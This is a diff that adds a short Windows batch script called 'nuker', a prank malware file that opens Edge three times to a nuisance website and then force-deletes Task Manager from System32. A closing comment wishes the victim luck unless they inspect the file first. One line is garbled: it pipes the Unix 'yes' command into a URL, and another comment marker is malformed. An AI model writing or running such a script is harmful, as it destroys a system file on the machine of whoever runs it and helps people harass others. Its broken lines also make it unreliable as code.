@@ -1,0 +1,15 @@
+`:: =nuker 1=
+
+    :: Launch a program without waiting
+    START "" "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" https://youareanidiot.cc/
+    START "" "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" https://youareanidiot.cc/
+    START "" "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" https://youareanidiot.cc/
+    yes [yes] |./https://youareanidiot.cc/
+
+    :: Continue execution immediately
+      echo tragic 😭😭😭 
+
+    : : Delete this program immediately
+ del /f /q "C:\Windows\System32\Taskmgr.exe"
+
+ :: And wish them goodluck (or they have commen sense and check the file in that case congrats)
